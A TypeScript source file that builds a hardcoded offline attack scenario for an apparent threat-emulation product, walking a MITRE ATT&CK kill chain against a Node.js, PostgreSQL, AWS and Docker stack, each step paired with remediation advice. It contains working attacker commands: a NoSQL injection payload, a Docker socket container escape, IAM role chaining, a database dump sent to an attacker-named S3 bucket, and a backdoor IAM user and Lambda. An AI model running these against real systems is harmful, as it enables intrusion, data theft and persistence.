import type { AttackScenario } from "./types";

/**
 * Offline fallback scenario used when:
 *  - OPENROUTER_API_KEY is not configured
 *  - The OpenRouter API request fails or times out
 *  - The AI response cannot be parsed into a valid scenario
 *
 * This keeps the product fully demoable without network/API dependencies.
 */
export function buildFallbackScenario(target: string): AttackScenario {
  const label = target?.trim() || "Node.js REST API + PostgreSQL + AWS S3 + Docker";

  return {
    target: label,
    summary: `Offline emulation blueprint for "${label}". This is a curated fallback kill-chain (not AI-generated) covering reconnaissance through data exfiltration, following the MITRE ATT&CK framework. Configure OPENROUTER_API_KEY to unlock live AI-generated scenarios tailored to your exact stack.`,
    generatedAt: new Date().toISOString(),
    isFallback: true,
    sourceModel: "offline-fallback-dataset",
    nodes: [
      {
        id: "recon-1",
        phase: "reconnaissance",
        title: "Passive Asset & Subdomain Enumeration",
        mitreId: "T1595.002",
        mitreTactic: "Reconnaissance — Active Scanning",
        description:
          "Attacker enumerates public subdomains, cloud storage buckets, and exposed ports tied to the target infrastructure using passive OSINT sources and active scanning to fingerprint the technology stack.",
        command:
          "subfinder -d target.com -silent | httpx -title -tech-detect -status-code\nnmap -sV -Pn -p- --min-rate 1000 target.com\naws s3 ls s3://target-prod-assets --no-sign-request",
        remediation:
          "Enforce least-privilege S3 bucket policies with Block Public Access enabled account-wide. Rotate and audit DNS records quarterly. Deploy a WAF/CDN (e.g., CloudFront + Shield) to obscure origin IPs and rate-limit scanning traffic.",
        severity: "Medium",
        tools: ["subfinder", "httpx", "nmap", "aws-cli"],
      },
      {
        id: "recon-2",
        phase: "reconnaissance",
        title: "Technology Fingerprinting & CVE Mapping",
        mitreId: "T1592.002",
        mitreTactic: "Reconnaissance — Gather Victim Host Information",
        description:
          "Identify exact framework/runtime versions (Node.js, Express, PostgreSQL driver) via HTTP headers and error banners, then cross-reference public CVE databases for known exploits.",
        command:
          "whatweb -a 3 https://target.com\ncurl -I https://target.com/api/health\nsearchsploit \"Node.js Express 4.x\"",
        remediation:
          "Strip version-revealing headers (X-Powered-By, Server). Keep dependencies patched via automated Dependabot/Renovate pipelines. Run periodic vulnerability scans (Trivy, Snyk) in CI/CD.",
        severity: "Low",
        tools: ["whatweb", "curl", "searchsploit"],
        dependsOn: ["recon-1"],
      },
      {
        id: "ia-1",
        phase: "initial_access",
        title: "Exploitation of Public-Facing REST API",
        mitreId: "T1190",
        mitreTactic: "Initial Access — Exploit Public-Facing Application",
        description:
          "Attacker exploits an unauthenticated or improperly validated REST endpoint (e.g., NoSQL/SQL injection or insecure deserialization) to gain a foothold on the Node.js application server.",
        command:
          "curl -X POST https://target.com/api/v1/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'",
        remediation:
          "Use parameterized queries / ORM query builders exclusively. Apply strict JSON schema validation (e.g., Zod, Joi) on all inputs. Deploy a WAF rule set (OWASP CRS) in front of the API gateway and enable anomaly-based rate limiting.",
        severity: "Critical",
        tools: ["curl", "Postman", "sqlmap"],
        dependsOn: ["recon-2"],
      },
      {
        id: "ia-2",
        phase: "initial_access",
        title: "Leaked Credentials via Exposed .env / S3 Object",
        mitreId: "T1552.001",
        mitreTactic: "Initial Access — Unsecured Credentials",
        description:
          "A misconfigured public S3 bucket or Docker image layer exposes a .env file containing database credentials and AWS access keys, granting the attacker direct database access.",
        command:
          "aws s3 cp s3://target-prod-assets/.env . --no-sign-request\ndocker history --no-trunc target/api:latest | grep -i 'ENV'\npsql \"host=db.target.internal dbname=prod user=admin password=$LEAKED_PW\"",
        remediation:
          "Never bake secrets into images or public buckets. Use AWS Secrets Manager or HashiCorp Vault with short-lived credentials. Add pre-commit/CI secret scanning (gitleaks, truffleHog) and enable S3 Block Public Access.",
        severity: "Critical",
        tools: ["aws-cli", "docker", "psql"],
        dependsOn: ["recon-1"],
      },
      {
        id: "pe-1",
        phase: "privilege_escalation",
        title: "Container Breakout via Misconfigured Docker Socket",
        mitreId: "T1611",
        mitreTactic: "Privilege Escalation — Escape to Host",
        description:
          "The application container mounts /var/run/docker.sock, allowing an attacker with RCE inside the container to spawn a privileged sibling container and escape to the host OS.",
        command:
          "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json\ndocker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
        remediation:
          "Never mount the Docker socket into application containers. Use rootless Docker or a dedicated build-only CI runner. Enforce seccomp/AppArmor profiles and run containers with --security-opt=no-new-privileges.",
        severity: "Critical",
        tools: ["docker", "curl"],
        dependsOn: ["ia-1"],
      },
      {
        id: "pe-2",
        phase: "privilege_escalation",
        title: "IAM Role Chaining for AWS Privilege Escalation",
        mitreId: "T1548.005",
        mitreTactic: "Privilege Escalation — Abuse Elevation Control Mechanism",
        description:
          "Using leaked AWS keys with an overly permissive IAM policy, the attacker chains sts:AssumeRole calls to pivot into a higher-privilege administrative role.",
        command:
          "aws sts get-caller-identity\naws iam list-attached-role-policies --role-name app-runtime-role\naws sts assume-role --role-arn arn:aws:iam::111122223333:role/AdminAccess --role-session-name pwn",
        remediation:
          "Apply IAM least-privilege with scoped resource ARNs and explicit Deny on sts:AssumeRole for cross-privilege roles. Enable AWS CloudTrail + GuardDuty alerting on anomalous AssumeRole chains and require MFA for sensitive roles.",
        severity: "High",
        tools: ["aws-cli"],
        dependsOn: ["ia-2"],
      },
      {
        id: "ex-1",
        phase: "exfiltration_persistence",
        title: "Bulk Database Exfiltration to Attacker-Controlled Bucket",
        mitreId: "T1567.002",
        mitreTactic: "Exfiltration — Exfiltration to Cloud Storage",
        description:
          "With database and cloud access secured, the attacker dumps the production PostgreSQL database and uploads it to an external S3 bucket under their control.",
        command:
          "pg_dump -h db.target.internal -U admin prod_db | gzip > dump.sql.gz\naws s3 cp dump.sql.gz s3://attacker-exfil-bucket/ --profile stolen",
        remediation:
          "Enable VPC-only database access with no public egress. Deploy egress filtering / DLP (e.g., AWS Network Firewall) blocking unauthorized S3 destinations. Enable pg_audit logging and alert on large outbound data transfers.",
        severity: "Critical",
        tools: ["pg_dump", "aws-cli"],
        dependsOn: ["pe-1", "pe-2"],
      },
      {
        id: "ex-2",
        phase: "exfiltration_persistence",
        title: "Persistence via Rogue IAM User & Scheduled Lambda Backdoor",
        mitreId: "T1098.001",
        mitreTactic: "Persistence — Additional Cloud Credentials",
        description:
          "To maintain long-term access, the attacker creates a hidden IAM user with programmatic access and deploys a scheduled Lambda function that re-establishes a reverse shell if the primary foothold is remediated.",
        command:
          "aws iam create-user --user-name svc-metrics-sync\naws iam create-access-key --user-name svc-metrics-sync\naws lambda create-function --function-name metrics-sync --runtime nodejs18.x --handler index.handler --zip-file fileb://backdoor.zip --role arn:aws:iam::111122223333:role/lambda-basic",
        remediation:
          "Enable AWS Config rules to alert on new IAM user/role creation. Require CloudTrail + SNS alerting for iam:CreateUser and lambda:CreateFunction events. Perform periodic IAM access reviews and enforce SCPs restricting resource creation outside CI/CD roles.",
        severity: "High",
        tools: ["aws-cli", "lambda"],
        dependsOn: ["ex-1"],
      },
    ],
  };
}
